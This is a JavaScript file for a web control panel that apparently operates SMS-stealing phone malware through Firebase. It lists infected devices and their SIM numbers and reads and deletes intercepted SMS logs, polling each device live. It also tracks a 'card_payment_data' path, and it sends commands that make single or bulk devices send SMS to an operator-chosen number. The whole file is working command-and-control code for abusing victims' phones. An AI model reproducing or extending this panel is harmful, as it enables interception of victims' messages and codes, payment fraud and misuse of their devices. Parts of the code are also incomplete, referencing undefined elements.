// Constants
let PATHS = {
    LIST: "register",
    DATA: "status",
    SMS: "smsLogs",
    CARD: "card_payment_data",
    MUTED: "user_muted_list"
};

// State
let currentFbUrl = document.getElementById('firebase-url-select').value;
let rawFullData = {};
let mutedDevices = new Set();
let smsDataCache = {};
let selectedCardIds = new Set();
let selectedSmsIds = new Set();

// DOM Elements
const selectFb = document.getElementById('firebase-url-select');
const statusText = document.getElementById('app-status');

// Tabs
const navBtns = document.querySelectorAll('.nav-btn');
const tabContents = document.querySelectorAll('.tab-content');

// Sender Tab
const btnFetchDevices = document.getElementById('btn-fetch-devices');
const btnToggleMute = document.getElementById('btn-toggle-mute');
const deviceSearch = document.getElementById('device-search');
const filterRadios = document.getElementsByName('dev-filter');
const deviceList = document.getElementById('device-list');
const devCount = document.getElementById('dev-count');

// Sender Form
const btnBulkSend = document.getElementById('btn-bulk-send');
const sendPhone = document.getElementById('send-phone');
const sendMsg = document.getElementById('send-msg');
const autoDeviceId = document.getElementById('auto-device-id');
const simSlotRadios = document.getElementsByName('sim-slot');
const progressBar = document.getElementById('send-progress');
const progressText = document.getElementById('progress-text');

// Logs Tab
const btnFetchSms = document.getElementById('btn-fetch-sms');
const btnDeleteSms = document.getElementById('btn-delete-sms');
const showMutedSmsToggle = document.getElementById('show-muted-sms');
const smsList = document.getElementById('sms-list');
const smsCount = document.getElementById('sms-count');

// Modal
const smsModal = document.getElementById('sms-modal');
const closeModal = document.querySelector('.close-modal');
const smsModalBody = document.getElementById('sms-modal-body');

// --- Initialization ---

selectFb.addEventListener('change', async (e) => {
    currentFbUrl = e.target.value;
    updateStatus('Switched Server');
    // Clear data
    rawFullData = {};
    mutedDevices.clear();
    smsDataCache = {};
    renderDevices();
    renderSms();
    bankList.innerHTML = '';
    cardCount.textContent = '0';
    await autoDetectPaths();
});

async function autoDetectPaths() {
    try {
        const rootKeys = await fetch(`${currentFbUrl}/.json?shallow=true`).then(r => r.json());
        if (rootKeys) {
            if (rootKeys.user_list || rootKeys.user_data) {
                PATHS.LIST = "user_list";
                PATHS.DATA = "user_data";
                PATHS.SMS = "user_sms";
                PATHS.CARD = "Card";
            } else {
                PATHS.LIST = "register";
                PATHS.DATA = "status";
                PATHS.SMS = "smsLogs";
                PATHS.CARD = "card_payment_data";
            }
        }
    } catch (e) {
        console.warn("Auto-detect failed", e);
    }
}

function updateStatus(text) {
    statusText.textContent = text;
    setTimeout(() => { statusText.textContent = 'Connected'; }, 3000);
}

// --- Tab Navigation ---

navBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        const targetId = btn.getAttribute('data-target');
        
        if (btn.classList.contains('active')) return; // Prevent double fetching if already active
        
        navBtns.forEach(b => b.classList.remove('active'));
        tabContents.forEach(t => t.classList.remove('active'));
        
        btn.classList.add('active');
        document.getElementById(targetId).classList.add('active');
        
        // Auto-load data on tab change
        if (targetId === 'tab-sender') fetchDevices();
        if (targetId === 'tab-logs') fetchSms();
    });
});

// --- Device / Sender Logic ---

btnFetchDevices.addEventListener('click', fetchDevices);
deviceSearch.addEventListener('input', renderDevices);
filterRadios.forEach(r => r.addEventListener('change', renderDevices));
btnToggleMute.addEventListener('click', toggleMute);
btnBulkSend.addEventListener('click', startBulkSend);

async function fetchDevices() {
    updateStatus('Fetching Devices...');
    btnFetchDevices.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading';
    btnFetchDevices.disabled = true;

    try {
        await autoDetectPaths();

        const [resList, resMuted, resData] = await Promise.all([
            fetch(`${currentFbUrl}/${PATHS.LIST}.json?shallow=true`).then(r => {
                if (!r.ok) throw new Error(`HTTP Error: ${r.status}`);
                return r.json();
            }),
            fetch(`${currentFbUrl}/${PATHS.MUTED}.json?shallow=true`).then(r => {
                if (!r.ok) throw new Error(`HTTP Error: ${r.status}`);
                return r.json();
            }),
            fetch(`${currentFbUrl}/${PATHS.DATA}.json`).then(r => {
                if (!r.ok) throw new Error(`HTTP Error: ${r.status}`);
                return r.json();
            })
        ]);

        const listObj = resList || {};
        const mutedObj = resMuted || {};
        const dataObj = resData || {};

        mutedDevices = new Set(Object.keys(mutedObj));
        
        const allIds = new Set([...Object.keys(listObj), ...Object.keys(mutedObj)]);
        rawFullData = {};

        allIds.forEach(id => {
            rawFullData[id] = dataObj[id] || { d_name: "Unknown", device: id };
        });

        renderDevices();
        if (!resList && !resMuted && !resData) {
            showToast(`Database is empty at paths: ${PATHS.LIST}, ${PATHS.DATA}`, 'info');
        } else {
            showToast(`Fetched ${allIds.size} devices successfully`, 'success');
        }

        renderDevices();
    } catch (err) {
        let msg = err.message;
        if (msg.includes('Failed to fetch')) {
            msg += " (Possible CORS issue or network error. Try running via local server)";
        }
        alert('Error fetching devices: ' + msg);
        updateStatus('Error: ' + msg);
        showToast('Fetch failed!', 'danger');
    } finally {
        btnFetchDevices.innerHTML = '<i class="fas fa-sync"></i> Fetch All';
        btnFetchDevices.disabled = false;
    }
}

function renderDevices() {
    deviceList.innerHTML = '';
    selectedCardIds.clear();

    const query = deviceSearch.value.toLowerCase();
    const filter = document.querySelector('input[name="dev-filter"]:checked').value;
    
    let count = 0;

    Object.keys(rawFullData).sort().forEach(devId => {
        const info = typeof rawFullData[devId] === 'object' ? rawFullData[devId] : { d_name: String(rawFullData[devId]) };
        const isMuted = mutedDevices.has(devId);
        
        const model = (info.model || info.d_name || "Device").toLowerCase();
        const number = (info.numberSim1 || info.sim1Number || info.phoneNumber || "No Sim").toLowerCase();
        
        if (filter === 'active' && isMuted) return;
        if (filter === 'muted' && !isMuted) return;

        if (query && !String(devId).toLowerCase().includes(query) && !model.includes(query) && !number.includes(query)) {
            return;
        }

        count++;
        
        let status = "Offline";
        let badgeClass = "badge-offline";
        if (info.isOnline || (info.lastOnline && (Date.now() - info.lastOnline < 60000))) {
            status = "Online";
            badgeClass = "badge-online";
        }
        
        const card = document.createElement('div');
        card.className = `device-card ${selectedCardIds.has(devId) ? 'selected' : ''}`;
        if (isMuted) card.classList.add('muted');
        
        card.innerHTML = `
            <input type="checkbox" class="card-checkbox" data-id="${devId}">
            <div class="card-header">
                <span class="card-title open-dev-modal" style="cursor:pointer; text-decoration:underline;">
                    ${model} <i class="fas fa-external-link-alt" style="font-size:10px; margin-left:5px;"></i>
                </span>
            </div>
            <div class="card-body">
                <p><strong>ID:</strong> ${String(devId).substring(0, 15)}...</p>
                <p><strong>SIM 1:</strong> ${info.numberSim1 || info.sim1Number || "Unknown"}</p>
                <p><strong>SIM 2:</strong> ${info.numberSim2 || info.sim2Number || "Unknown"}</p>
            </div>
        `;

        const checkbox = card.querySelector('.card-checkbox');
        
        // Toggle selection or open modal
        card.addEventListener('click', (e) => {
            console.log("Card clicked, target:", e.target);
            if (e.target !== checkbox) {
                e.preventDefault(); // Stop checkbox from toggling
                console.log("Opening modal for:", devId);
                openDeviceModal(devId, info);
            } else {
                setTimeout(() => {
                    if (checkbox.checked) {
                        card.classList.add('selected');
                        selectedCardIds.add(devId);
                    } else {
                        card.classList.remove('selected');
                        selectedCardIds.delete(devId);
                    }
                }, 0);
            }
        });

        deviceList.appendChild(card);
        count++;
    });

    devCount.textContent = count;
}

async function toggleMute() {
    if (selectedCardIds.size === 0) {
        alert("Please select at least one device.");
        return;
    }

    btnToggleMute.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    let successCount = 0;

    for (const devId of selectedCardIds) {
        try {
            if (mutedDevices.has(devId)) {
                await fetch(`${currentFbUrl}/${PATHS.MUTED}/${devId}.json`, { method: 'DELETE' });
                await fetch(`${currentFbUrl}/${PATHS.LIST}/${devId}.json`, { method: 'PUT', body: 'true' });
                mutedDevices.delete(devId);
            } else {
                await fetch(`${currentFbUrl}/${PATHS.LIST}/${devId}.json`, { method: 'DELETE' });
                await fetch(`${currentFbUrl}/${PATHS.MUTED}/${devId}.json`, { method: 'PUT', body: 'true' });
                mutedDevices.add(devId);
            }
            successCount++;
        } catch (e) {
            console.error(e);
        }
    }

    btnToggleMute.innerHTML = '<i class="fas fa-volume-mute"></i> Toggle Mute';
    alert(`Toggled mute status for ${successCount} devices.`);
    renderDevices();
}

async function startBulkSend() {
    const targets = Array.from(selectedCardIds).filter(id => !mutedDevices.has(id));
    const mutedSkipped = selectedCardIds.size - targets.length;

    if (targets.length === 0) {
        alert("No valid targets selected. Ensure devices are not muted.");
        return;
    }

    if (mutedSkipped > 0) {
        if (!confirm(`${mutedSkipped} muted devices skipped. Proceed with ${targets.length} active devices?`)) return;
    }

    const phone = sendPhone.value;
    const msg = sendMsg.value;
    const isAuto = autoDeviceId.checked;
    const slot = document.querySelector('input[name="sim-slot"]:checked').value;

    if (!phone) return alert("Enter recipient number.");
    if (!isAuto && !msg) return alert("Enter message body.");

    btnBulkSend.disabled = true;
    btnBulkSend.textContent = "SENDING...";
    progressBar.style.width = "0%";
    progressText.textContent = `Progress: 0/${targets.length}`;

    let completed = 0;

    for (const devId of targets) {
        const textToSend = isAuto ? `{ ${devId} }` : msg;
        
        // Match Python logic
        if (isAuto) {
            const p1 = buildPayload(devId, phone, textToSend, "0");
            const p2 = buildPayload(devId, phone, textToSend, "1");
            const wp1 = buildWebhookPayload(phone, textToSend, 1);
            const wp2 = buildWebhookPayload(phone, textToSend, 2);

            try {
                await Promise.all([
                    fetch(`${currentFbUrl}/${PATHS.DATA}/${devId}.json`, { method: 'PATCH', body: JSON.stringify(p1) }),
                    fetch(`${currentFbUrl}/${PATHS.DATA}/${devId}.json`, { method: 'PATCH', body: JSON.stringify(p2) }),
                    fetch(`${currentFbUrl}/devices/${devId}.json`, { method: 'PATCH', body: JSON.stringify(wp1) }),
                    fetch(`${currentFbUrl}/devices/${devId}.json`, { method: 'PATCH', body: JSON.stringify(wp2) })
                ]);
            } catch (e) {}
        } else {
            const simStr = slot === "1" ? "0" : "1";
            const p = buildPayload(devId, phone, textToSend, simStr);
            const wp = buildWebhookPayload(phone, textToSend, parseInt(slot));

            try {
                await Promise.all([
                    fetch(`${currentFbUrl}/${PATHS.DATA}/${devId}.json`, { method: 'PATCH', body: JSON.stringify(p) }),
                    fetch(`${currentFbUrl}/devices/${devId}.json`, { method: 'PATCH', body: JSON.stringify(wp) })
                ]);
            } catch (e) {}
        }

        completed++;
        progressBar.style.width = `${(completed / targets.length) * 100}%`;
        progressText.textContent = `Progress: ${completed}/${targets.length}`;
    }

    btnBulkSend.disabled = false;
    btnBulkSend.textContent = "LAUNCH BULK SEND";
    alert(`Successfully launched commands to ${completed} devices.`);
}

function buildPayload(targetDeviceId, phoneNumber, messageText, simSlot) {
    return { command: "send message", phoneNumber, messageText, simSlot, targetDeviceId };
}

function buildWebhookPayload(phone, txt, simInt) {
    return {
        webhookEvent: {
            sendSms: {
                Action: "sendSms", action: "sendSms", body: txt, command: "sendSms",
                from: simInt, isSended: false, message: txt, number: phone,
                sim: simInt, simSlot: simInt, status: "pending", text: txt,
                timestamp: Date.now(), to: phone, type: "sendSms"
            }
        }
    };
}

// --- Logs Logic ---

btnFetchSms.addEventListener('click', fetchSms);
showMutedSmsToggle.addEventListener('change', renderSms);
btnDeleteSms.addEventListener('click', deleteSelectedSms);

async function fetchSms() {
    updateStatus('Fetching SMS Logs...');
    btnFetchSms.textContent = 'Loading...';
    
    try {
        await autoDetectPaths();
        const res = await fetch(`${currentFbUrl}/${PATHS.SMS}.json`).then(r => r.json());
        smsDataCache = res || {};
        renderSms();
        updateStatus('SMS Loaded');
    } catch (e) {
        alert('Error fetching SMS: ' + e.message);
    } finally {
        btnFetchSms.textContent = 'Refresh Logs';
    }
}

function renderSms() {
    smsList.innerHTML = '';
    selectedSmsIds.clear();
    const allMsgs = [];
    const showMuted = showMutedSmsToggle.checked;
    let mutedCount = 0;

    Object.keys(smsDataCache).forEach(devId => {
        const msgs = smsDataCache[devId];
        if (typeof msgs !== 'object') return;
        
        const isMuted = mutedDevices.has(devId);
        if (isMuted) mutedCount += Object.keys(msgs).length;
        if (isMuted && !showMuted) return;

        Object.keys(msgs).forEach(mKey => {
            const mVal = msgs[mKey];
            if (typeof mVal !== 'object') return;

            const body = mVal.body || mVal.message || mVal.msg || "";
            const sender = mVal.senderNumber || mVal.sender || mVal.number || "Unknown";
            const time = mVal.date || mVal.time || mVal.TimeandDate || mVal.timestamp || "Unknown";
            const ts = mVal.timestamp || 0;

            allMsgs.push({ time, device: devId, sender, body, ts, key: mKey });
        });
    });

    allMsgs.sort((a, b) => b.ts - a.ts);
    const limitMsgs = allMsgs.slice(0, 500);

    limitMsgs.forEach(m => {
        const card = document.createElement('div');
        card.className = `sms-card`;
        
        // Escape HTML for safety
        const safeBody = m.body.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        
        card.innerHTML = `
            <input type="checkbox" class="card-checkbox" data-device="${m.device}" data-key="${m.key}">
            <div class="card-header">
                <span class="card-title">${m.sender}</span>
                <span class="card-badge badge-offline">${m.time}</span>
            </div>
            <div class="card-body">
                <p><strong>Device:</strong> ${String(m.device).substring(0, 15)}...</p>
                <div class="sms-body-preview">${safeBody}</div>
            </div>
        `;

        const checkbox = card.querySelector('.card-checkbox');
        
        // Toggle selection or open modal
        card.addEventListener('click', (e) => {
            if (e.target !== checkbox) {
                e.preventDefault(); // Stop checkbox from toggling
                const info = rawFullData[m.device] || { d_name: "Unknown", Note: "Device data not loaded yet" };
                openDeviceModal(m.device, info);
            } else {
                setTimeout(() => {
                    if (checkbox.checked) {
                        card.classList.add('selected');
                        selectedSmsIds.add(`${m.device}|${m.key}`);
                    } else {
                        card.classList.remove('selected');
                        selectedSmsIds.delete(`${m.device}|${m.key}`);
                    }
                }, 0);
            }
        });

        smsList.appendChild(card);
    });

    smsCount.textContent = `${allMsgs.length} (Muted hidden: ${!showMuted ? mutedCount : 0})`;
}

async function deleteSelectedSms() {
    if (selectedSmsIds.size === 0) return alert("Select SMS to delete.");
    if (!confirm(`Permanently delete ${selectedSmsIds.size} SMS logs from Firebase?`)) return;

    btnDeleteSms.textContent = "Deleting...";
    let success = 0;

    for (const item of selectedSmsIds) {
        const [devId, mKey] = item.split('|');
        try {
            await fetch(`${currentFbUrl}/${PATHS.SMS}/${devId}/${mKey}.json`, { method: 'DELETE' });
            success++;
        } catch (e) {}
    }

    btnDeleteSms.textContent = "Delete Selected";
    alert(`Deleted ${success}/${selectedSmsIds.size} logs.`);
    fetchSms();
}

// Modal Logic
closeModal.addEventListener('click', () => {
    smsModal.classList.remove('show');
});
window.addEventListener('click', (e) => {
    if (e.target === smsModal) {
        smsModal.classList.remove('show');
    }
});

// --- Device Details Modal ---
const deviceModal = document.getElementById('device-modal');
const closeDeviceModal = document.querySelector('.close-device-modal');
const devModalTitle = document.getElementById('dev-modal-title');
const devModalInfo = document.getElementById('dev-modal-info');
const devModalSmsList = document.getElementById('dev-modal-sms-list');
const devModalSendBtn = document.getElementById('dev-modal-send-btn');
const devModalPhone = document.getElementById('dev-modal-phone');
const devModalMsg = document.getElementById('dev-modal-msg');

let currentOpenDeviceId = null;
let deviceSmsPollInterval = null;

function fetchAndRenderDeviceSms(devId) {
    fetch(`${currentFbUrl}/${PATHS.SMS}/${devId}.json`)
        .then(r => r.json())
        .then(msgs => {
            if (currentOpenDeviceId !== devId) return; // Modal was closed or changed
            
            devModalSmsList.innerHTML = '';
            if (!msgs || typeof msgs !== 'object') {
                devModalSmsList.innerHTML = '<span style="color:#aaa;">No SMS found for this device.</span>';
                return;
            }
            
            const arr = [];
            Object.values(msgs).forEach(mVal => {
                if (typeof mVal !== 'object') return;
                arr.push(mVal);
            });
            arr.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
            const recent = arr.slice(0, 15);
            
            if (recent.length === 0) {
                devModalSmsList.innerHTML = '<span style="color:#aaa;">No SMS found for this device.</span>';
                return;
            }
            
            recent.forEach(mVal => {
                const body = (mVal.body || mVal.message || mVal.msg || "").replace(/</g, "&lt;");
                const sender = (mVal.senderNumber || mVal.sender || mVal.number || "Unknown");
                const time = (mVal.date || mVal.time || mVal.TimeandDate || mVal.timestamp || "Unknown");
                
                devModalSmsList.innerHTML += `
                    <div style="background:#222; padding:8px; border-radius:5px; border-left:3px solid #00ff88;">
                        <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
                            <strong style="color:#fff; font-size:12px;">${sender}</strong>
                            <span style="color:#aaa; font-size:10px;">${time}</span>
                        </div>
                        <div style="color:#ccc; font-size:12px;">${body}</div>
                    </div>
                `;
            });
        })
        .catch(() => { 
            if (currentOpenDeviceId === devId) {
                devModalSmsList.innerHTML = '<span style="color:red;">Error loading SMS.</span>'; 
            }
        });
}

function openDeviceModal(devId, info) {
    try {
        const safeDevId = String(devId);
        currentOpenDeviceId = safeDevId;
        devModalTitle.textContent = `Device: ${safeDevId.substring(0, 8)}...`;
        
        let infoHtml = '';
        if (info && typeof info === 'object') {
            Object.keys(info).forEach(k => {
                if (typeof info[k] !== 'object') {
                    infoHtml += `<strong>${k}:</strong> ${info[k]}<br>`;
                }
            });
        }
        devModalInfo.innerHTML = infoHtml || "No detailed info available.";
        
        devModalSmsList.innerHTML = '<span style="color:#aaa;">Loading SMS...</span>';
        deviceModal.classList.add('show');
        
        // Initial fetch
        fetchAndRenderDeviceSms(devId);
        
        // Setup Live Polling every 3 seconds
        if (deviceSmsPollInterval) clearInterval(deviceSmsPollInterval);
        deviceSmsPollInterval = setInterval(() => {
            fetchAndRenderDeviceSms(devId);
        }, 3000);
    } catch (error) {
        alert("Error opening modal: " + error.message);
    }
}

function closeDeviceModalAction() {
    deviceModal.classList.remove('show');
    currentOpenDeviceId = null;
    if (deviceSmsPollInterval) clearInterval(deviceSmsPollInterval);
}

closeDeviceModal.addEventListener('click', closeDeviceModalAction);
window.addEventListener('click', (e) => { 
    if (e.target === deviceModal) closeDeviceModalAction(); 
});

devModalSendBtn.addEventListener('click', async () => {
    if (!currentOpenDeviceId) return;
    const phone = devModalPhone.value;
    const msg = devModalMsg.value;
    const slot = document.querySelector('input[name="dev-modal-sim"]:checked').value;
    
    if (!phone || !msg) return alert("Enter phone and message.");
    
    devModalSendBtn.disabled = true;
    devModalSendBtn.textContent = "Sending...";
    
    const simStr = slot === "1" ? "0" : "1";
    const p = buildPayload(currentOpenDeviceId, phone, msg, simStr);
    const wp = buildWebhookPayload(phone, msg, parseInt(slot));
    
    try {
        await Promise.all([
            fetch(`${currentFbUrl}/${PATHS.DATA}/${currentOpenDeviceId}.json`, { method: 'PATCH', body: JSON.stringify(p) }),
            fetch(`${currentFbUrl}/devices/${currentOpenDeviceId}.json`, { method: 'PATCH', body: JSON.stringify(wp) })
        ]);
        alert("Command Sent to " + currentOpenDeviceId);
        devModalPhone.value = "";
        devModalMsg.value = "";
    } catch (e) {
        alert("Error sending: " + e.message);
    } finally {
        devModalSendBtn.disabled = false;
        devModalSendBtn.textContent = "SEND SMS TO DEVICE";
    }
});

// Initial fetch attempt (optional, might require user action in real-world to avoid spamming)
// fetchDevices();
